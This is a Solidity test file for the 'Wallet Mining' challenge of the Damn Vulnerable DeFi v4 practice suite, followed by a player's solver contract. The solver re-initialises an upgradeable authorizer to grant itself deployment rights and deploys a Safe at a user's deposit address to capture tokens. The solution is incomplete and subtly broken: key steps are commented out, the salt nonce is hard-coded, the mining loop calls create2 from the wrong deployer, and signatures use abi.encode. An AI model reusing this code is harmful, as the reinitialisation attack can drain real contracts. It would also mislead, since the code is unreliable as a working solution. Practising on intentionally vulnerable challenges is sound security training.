// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory,
    AuthorizerUpgradeable,
    TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS)
                .deployCreate2({
                    salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                    initCode: type(AuthorizerFactory).creationCode
                })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) = address(SAFE_SINGLETON_FACTORY_ADDRESS)
            .call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS)
                .deployCreate2({
                    salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                    initCode: bytes.concat(
                        type(WalletDeployer).creationCode,
                        abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                    )
                })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        // Constraints:
        // User must not send a transaction even tho we have their private key
        // Player can only send 1 transaction

        // Steps to solve Wallet Mining challenge:
        // 1) Deploy ChallengeSolver contract to execute all necessary operations in one transaction
        // 2) Recover all tokens from the wallet deployer contract and send them to the corresponding ward
        // 3) figure out the salt value and init code that deploys the safe to the correct address
        // 4) deploy safe on behalf of user to expected safe address
        // 5) recover funds from safe and send to user

        // deploy challenge solver contract to execute necessary operations in one transaction
        new ChallengeSolver(token, authorizer, walletDeployer, proxyFactory, ward, user, userPrivateKey);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

/*//////////////////////////////////////////////////////////////
                            SOLUTION
//////////////////////////////////////////////////////////////*/

import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
// import {Script} from "forge-std/Script.sol";

contract ChallengeSolver is Test {
    error ChallengeSolver__SafeTokenTransferFailed();

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    address ward;
    address user;
    uint256 userPrivateKey;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;

    constructor(
        DamnValuableToken token_,
        AuthorizerUpgradeable authorizer_,
        WalletDeployer walletDeployer_,
        SafeProxyFactory proxyFactory_,
        address ward_,
        address user_,
        uint256 userPrivateKey_
    ) {
        token = token_;
        authorizer = authorizer_;
        walletDeployer = walletDeployer_;
        proxyFactory = proxyFactory_;
        ward = ward_;
        user = user_;
        userPrivateKey = userPrivateKey_;

        run();
    }

    function run() public {
        // check balance of wallet deployer contract which will be sent to the ward address
        uint256 walletDeployerBalance = token.balanceOf(address(walletDeployer));

        // approve this contract to deploy a safe proxy at the user deposit address
        _authorizeChallengeSolverAsWard();

        // deploy safe proxy as an approved ward to receive deployment reward and rescue funds stuck at user deposit address
        _deploySafeProxyAtUserDepositAddress();

        // transfer tokens received as deployment incentive to ward address for challenge requirement
        // token.transfer(ward, walletDeployerBalance);

        // rescue funds from user safe and send to user
        // _sendFundsFromSafeToUserWithSafeTransaction();
    }

    function _authorizeChallengeSolverAsWard() internal {
        // check if initialization is possible
        console.log("authorizer needsInit: ", authorizer.needsInit());
        // load arrays with this contracts address and user deposit address for init call
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        // call init too approve this contract to deploy a safe proxy at the user deposit address
        authorizer.init(wards, aims);
    }

    function _deploySafeProxyAtUserDepositAddress() internal {
        // initial salt nonce needed to get safe proxy deployed at required address
        uint256 saltNonce = 0;

        // load initialization data for basic safe proxy deployment on users behalf
        address[] memory owners = new address[](1);
        owners[0] = user;
        uint256 threshold = 1;
        address to = address(0);
        bytes memory data = bytes("");
        address fallbackHandler = address(0);
        address paymentToken = address(0);
        uint256 payment = 0;
        address paymentReceiver = address(0);
        bytes memory initializerDataForSafeCreation = abi.encodeWithSelector(
            Safe.setup.selector, owners, threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver
        );

        console.logBytes32(keccak256(initializerDataForSafeCreation)); // = 0x63abaf09a56a704390e7608eea07de782d4306abae05ddc2ef967e9199e099b6

        // uint256 saltNonce = _mineSaltNonce(initializerDataForSafeCreation);

        // deploy safe proxy as an approved ward to receive deployment reward and rescue funds stuck at user deposit address
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializerDataForSafeCreation, saltNonce);
    }

    function _mineSaltNonce(bytes memory initializerDataForSafeCreation) internal returns (uint256) {
        SafeProxy proxy;
        address cpy = walletDeployer.cpy();
        bytes memory creationCode = proxyFactory.proxyCreationCode();
        for (uint256 i = 0; i < 2000; i++) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializerDataForSafeCreation), i));
            bytes memory deploymentData = abi.encodePacked(creationCode, uint256(uint160(cpy)));
            // solhint-disable-next-line no-inline-assembly
            assembly {
                proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)
            }
            if (address(proxy) == USER_DEPOSIT_ADDRESS) {
                return i;
            }
        }
    }

    function _sendFundsFromSafeToUserWithSafeTransaction() internal {
        // wrap address to be used in user safe calls
        Safe userDeployedSafe = Safe(payable(USER_DEPOSIT_ADDRESS));

        // load variables to be used in safe execTransaction call
        address safeTransactionTo = address(token);
        uint256 value = 0;
        bytes memory safeTransactionData = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
        Enum.Operation operation = Enum.Operation.Call; // 0 = call, 1 = delegatecall
        uint256 safeTxGas = 0;
        uint256 baseGas = 0;
        uint256 gasPrice = 0;
        address gasToken = address(0);
        address payable refundReceiver = payable(address(this));
        uint256 nonce = userDeployedSafe.nonce();

        // hash safe transaction data to be signed with users private key
        bytes32 safeTransactionDigest = userDeployedSafe.getTransactionHash(
            safeTransactionTo,
            value,
            safeTransactionData,
            operation,
            safeTxGas,
            baseGas,
            gasPrice,
            gasToken,
            refundReceiver,
            nonce
        );

        // sign safe transaction with users private key and pack for verification
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, safeTransactionDigest);
        bytes memory signatures = abi.encode(r, s, v);

        bool success = userDeployedSafe.execTransaction(
            safeTransactionTo,
            value,
            safeTransactionData,
            operation,
            safeTxGas,
            baseGas,
            gasPrice,
            gasToken,
            refundReceiver,
            signatures
        );
        if (!success) {
            revert ChallengeSolver__SafeTokenTransferFailed();
        }
    }
}
